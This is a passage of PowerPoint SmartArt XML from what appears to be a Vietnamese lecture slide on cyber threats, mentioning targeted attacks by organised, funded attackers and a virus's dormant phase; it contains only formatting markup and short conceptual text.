            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>với</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>mục</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tiêu</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>, </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>áp</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>dụng</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>cho</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>đến</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>khi</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>mục</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tiêu</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>bị</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tổn</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>hại</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" i="1" dirty="0"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F9F8D8DC-EE43-4116-A4B2-A7D1B2CB19F8}" type="parTrans" cxnId="{B328D132-32FB-4CA1-AD8D-9FE943B061A9}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B0E9BE90-F1AE-4C12-8A42-03791BE28BFD}" type="sibTrans" cxnId="{B328D132-32FB-4CA1-AD8D-9FE943B061A9}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{35913CD5-F3E2-4492-BF6F-302B44C269F9}">
      <dgm:prSet phldrT="[Text]"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Mối</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đe</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dọa</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đối</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với</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mục</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tiêu</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được</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lựa</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chọn</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> do </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>các</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kẻ</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tấn</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công</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có</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tổ</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chức</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có</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khả</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năng</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và</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được</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tài</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trợ</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làm</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tăng</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đáng</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kể</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mức</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độ</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đe</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dọa</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>.</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" i="1" dirty="0"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{030F5263-B67C-4AEA-A999-A4C35205DEFB}" type="parTrans" cxnId="{93CBD34C-6962-4AA8-9EB9-A5A97F0B4475}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E9E89715-8596-4105-9FEA-BDCC436DF218}" type="sibTrans" cxnId="{93CBD34C-6962-4AA8-9EB9-A5A97F0B4475}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7631B92F-3935-4E38-8D4C-47129EED93A3}" type="pres">
      <dgm:prSet presAssocID="{0218D2D0-3BA3-4395-9875-81487796F48B}" presName="outerComposite" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:chMax val="5"/>
          <dgm:dir/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CE1C43C4-0D3D-43A2-9050-B05020B1D2C9}" type="pres">
      <dgm:prSet presAssocID="{0218D2D0-3BA3-4395-9875-81487796F48B}" presName="dummyMaxCanvas" presStyleCnt="0">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A48228B3-DD94-4E9E-AD1B-B86615D12633}" type="pres">
      <dgm:prSet presAssocID="{0218D2D0-3BA3-4395-9875-81487796F48B}" presName="ThreeNodes_1" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="3" custLinFactNeighborX="184" custLinFactNeighborY="4547">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{07225F6F-5DFB-4E28-A2CA-D9DA0426DCC3}" type="pres">
      <dgm:prSet presAssocID="{0218D2D0-3BA3-4395-9875-81487796F48B}" presName="ThreeNodes_2" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C762EB0F-9E8C-48F7-A209-FC8474A7DFBC}" type="pres">
      <dgm:prSet presAssocID="{0218D2D0-3BA3-4395-9875-81487796F48B}" presName="ThreeNodes_3" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5D7817A0-E7CA-4DBB-A3E8-3B88832A755A}" type="pres">
      <dgm:prSet presAssocID="{0218D2D0-3BA3-4395-9875-81487796F48B}" presName="ThreeConn_1-2" presStyleLbl="fgAccFollowNode1" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{56525E79-0E53-4BB0-AF68-DA4B1569D4D1}" type="pres">
      <dgm:prSet presAssocID="{0218D2D0-3BA3-4395-9875-81487796F48B}" presName="ThreeConn_2-3" presStyleLbl="fgAccFollowNode1" presStyleIdx="1" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{6313030D-D643-4A39-8FEB-C78FD9AAC3B1}" type="pres">
      <dgm:prSet presAssocID="{0218D2D0-3BA3-4395-9875-81487796F48B}" presName="ThreeNodes_1_text" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B96D8853-AF12-4B12-A407-0B670F8B6CB9}" type="pres">
      <dgm:prSet presAssocID="{0218D2D0-3BA3-4395-9875-81487796F48B}" presName="ThreeNodes_2_text" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{9EEE474B-1F2C-4281-B9E7-23C6224CDFB5}" type="pres">
      <dgm:prSet presAssocID="{0218D2D0-3BA3-4395-9875-81487796F48B}" presName="ThreeNodes_3_text" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{0820320C-A468-450D-929E-A9ACB622A982}" type="presOf" srcId="{8FA528DD-7220-44AD-97F3-D4A546086898}" destId="{6313030D-D643-4A39-8FEB-C78FD9AAC3B1}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{3BB3E511-2108-40B4-82D0-E0CE3D30307D}" type="presOf" srcId="{74CD2459-A132-44D2-BD42-6304D159151D}" destId="{6313030D-D643-4A39-8FEB-C78FD9AAC3B1}" srcOrd="1" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{2849B315-8275-42E4-93A0-B8B0A6472CB7}" type="presOf" srcId="{35913CD5-F3E2-4492-BF6F-302B44C269F9}" destId="{C762EB0F-9E8C-48F7-A209-FC8474A7DFBC}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{23C86D17-79DF-43CB-9FB4-515210247EA2}" srcId="{0218D2D0-3BA3-4395-9875-81487796F48B}" destId="{1CF1123F-09BA-4DB9-9951-C45A57D73BC0}" srcOrd="1" destOrd="0" parTransId="{C43F75D8-65D6-4C75-851C-B67A66B268A3}" sibTransId="{701F270F-451D-4A1F-A80E-EA6FCBE15305}"/>
    <dgm:cxn modelId="{B328D132-32FB-4CA1-AD8D-9FE943B061A9}" srcId="{1CF1123F-09BA-4DB9-9951-C45A57D73BC0}" destId="{0CB32042-ED3C-400A-8C61-D8CCF67B96D7}" srcOrd="0" destOrd="0" parTransId="{F9F8D8DC-EE43-4116-A4B2-A7D1B2CB19F8}" sibTransId="{B0E9BE90-F1AE-4C12-8A42-03791BE28BFD}"/>
    <dgm:cxn modelId="{3C1BE348-3F17-4B8C-B490-CB70DAEB7477}" type="presOf" srcId="{4BBACB04-02FF-4B29-ACDD-E956FC927781}" destId="{9EEE474B-1F2C-4281-B9E7-23C6224CDFB5}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{93CBD34C-6962-4AA8-9EB9-A5A97F0B4475}" srcId="{4BBACB04-02FF-4B29-ACDD-E956FC927781}" destId="{35913CD5-F3E2-4492-BF6F-302B44C269F9}" srcOrd="0" destOrd="0" parTransId="{030F5263-B67C-4AEA-A999-A4C35205DEFB}" sibTransId="{E9E89715-8596-4105-9FEA-BDCC436DF218}"/>
    <dgm:cxn modelId="{CAEFA94F-9668-49E9-A193-00485539F873}" type="presOf" srcId="{4BBACB04-02FF-4B29-ACDD-E956FC927781}" destId="{C762EB0F-9E8C-48F7-A209-FC8474A7DFBC}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{B0D4DA4F-17E0-42A6-8D97-9D7CA4487A12}" srcId="{0218D2D0-3BA3-4395-9875-81487796F48B}" destId="{4BBACB04-02FF-4B29-ACDD-E956FC927781}" srcOrd="2" destOrd="0" parTransId="{71A416C0-389E-4114-9CAC-7C3893B11C9F}" sibTransId="{320FD54D-5911-4141-822B-5DC15D401370}"/>
    <dgm:cxn modelId="{C8228D77-98A5-4E54-9BC6-3D1FB7A76FED}" type="presOf" srcId="{1CF1123F-09BA-4DB9-9951-C45A57D73BC0}" destId="{B96D8853-AF12-4B12-A407-0B670F8B6CB9}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{DBED4682-CDD4-4B77-ABBF-386AEF875784}" type="presOf" srcId="{1CF1123F-09BA-4DB9-9951-C45A57D73BC0}" destId="{07225F6F-5DFB-4E28-A2CA-D9DA0426DCC3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{68E18095-3C91-4082-A7C9-A24DADF6213C}" type="presOf" srcId="{0218D2D0-3BA3-4395-9875-81487796F48B}" destId="{7631B92F-3935-4E38-8D4C-47129EED93A3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{069BA6A9-2BB8-4145-B247-C01CAACB10B8}" type="presOf" srcId="{74CD2459-A132-44D2-BD42-6304D159151D}" destId="{A48228B3-DD94-4E9E-AD1B-B86615D12633}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{EC83BEB0-9B13-4E98-8DB1-0566CB3174B8}" type="presOf" srcId="{1BA1265C-9583-4F55-B613-1E366D40024D}" destId="{5D7817A0-E7CA-4DBB-A3E8-3B88832A755A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{B00933B4-D846-477E-BF91-373AE0D5A784}" type="presOf" srcId="{0CB32042-ED3C-400A-8C61-D8CCF67B96D7}" destId="{B96D8853-AF12-4B12-A407-0B670F8B6CB9}" srcOrd="1" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{8FCE32BF-8DF1-44D5-809F-3ACB62D150D3}" srcId="{0218D2D0-3BA3-4395-9875-81487796F48B}" destId="{8FA528DD-7220-44AD-97F3-D4A546086898}" srcOrd="0" destOrd="0" parTransId="{1825BC1D-A53E-41AB-BB23-7D855D4081B6}" sibTransId="{1BA1265C-9583-4F55-B613-1E366D40024D}"/>
    <dgm:cxn modelId="{99F6FCC2-3524-473D-97F1-4BD931C4DA5C}" type="presOf" srcId="{0CB32042-ED3C-400A-8C61-D8CCF67B96D7}" destId="{07225F6F-5DFB-4E28-A2CA-D9DA0426DCC3}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{3891C9CC-11B1-41BC-B910-B1FE7223C7C9}" type="presOf" srcId="{701F270F-451D-4A1F-A80E-EA6FCBE15305}" destId="{56525E79-0E53-4BB0-AF68-DA4B1569D4D1}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{D39DA2D6-CB1F-406A-9006-252534F06E70}" type="presOf" srcId="{35913CD5-F3E2-4492-BF6F-302B44C269F9}" destId="{9EEE474B-1F2C-4281-B9E7-23C6224CDFB5}" srcOrd="1" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{93575AE1-B351-43D0-BFA7-3BB6EEE11EFE}" srcId="{8FA528DD-7220-44AD-97F3-D4A546086898}" destId="{74CD2459-A132-44D2-BD42-6304D159151D}" srcOrd="0" destOrd="0" parTransId="{A72D74DA-C7B8-445B-AF00-7D9C2931D5E6}" sibTransId="{B66EDF7F-FD53-462D-831B-BD167FF5B797}"/>
    <dgm:cxn modelId="{E7A575FD-1329-4A23-9C46-490E856FE15D}" type="presOf" srcId="{8FA528DD-7220-44AD-97F3-D4A546086898}" destId="{A48228B3-DD94-4E9E-AD1B-B86615D12633}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{63793267-B208-415A-8A7E-A5FB2418E728}" type="presParOf" srcId="{7631B92F-3935-4E38-8D4C-47129EED93A3}" destId="{CE1C43C4-0D3D-43A2-9050-B05020B1D2C9}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{D939172F-4461-4E75-8BB8-74B1EA37388E}" type="presParOf" srcId="{7631B92F-3935-4E38-8D4C-47129EED93A3}" destId="{A48228B3-DD94-4E9E-AD1B-B86615D12633}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{52CB6A00-AC4F-47C6-A25D-556742582903}" type="presParOf" srcId="{7631B92F-3935-4E38-8D4C-47129EED93A3}" destId="{07225F6F-5DFB-4E28-A2CA-D9DA0426DCC3}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{800FDDC6-EBE8-4B93-8440-271080F6826F}" type="presParOf" srcId="{7631B92F-3935-4E38-8D4C-47129EED93A3}" destId="{C762EB0F-9E8C-48F7-A209-FC8474A7DFBC}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{7011D575-63B8-40DB-8951-9104BAF44A99}" type="presParOf" srcId="{7631B92F-3935-4E38-8D4C-47129EED93A3}" destId="{5D7817A0-E7CA-4DBB-A3E8-3B88832A755A}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{8AF881F9-373E-432B-9768-B782CBE9FAA1}" type="presParOf" srcId="{7631B92F-3935-4E38-8D4C-47129EED93A3}" destId="{56525E79-0E53-4BB0-AF68-DA4B1569D4D1}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{0E25E886-A386-4D85-A431-EA2A3B57C80E}" type="presParOf" srcId="{7631B92F-3935-4E38-8D4C-47129EED93A3}" destId="{6313030D-D643-4A39-8FEB-C78FD9AAC3B1}" srcOrd="6" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{17251DD1-FCFD-42CC-991B-3005346CF087}" type="presParOf" srcId="{7631B92F-3935-4E38-8D4C-47129EED93A3}" destId="{B96D8853-AF12-4B12-A407-0B670F8B6CB9}" srcOrd="7" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{6CEC7632-857A-43CE-9365-5371868F7A37}" type="presParOf" srcId="{7631B92F-3935-4E38-8D4C-47129EED93A3}" destId="{9EEE474B-1F2C-4281-B9E7-23C6224CDFB5}" srcOrd="8"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D2739C-72ED-4FCD-B6B1-001B66AB767E}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="-7790"/>
          <a:ext cx="8689571" cy="1080820"/>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latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Dormant (</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>ngủ</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>đông</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>)</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="1800" b="1" kern="1200" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr marL="171450" lvl="1" indent="-171450" algn="just" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="15000"/>
            </a:spcAft>
            <a:buChar char="•"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>ở </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>trạng</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
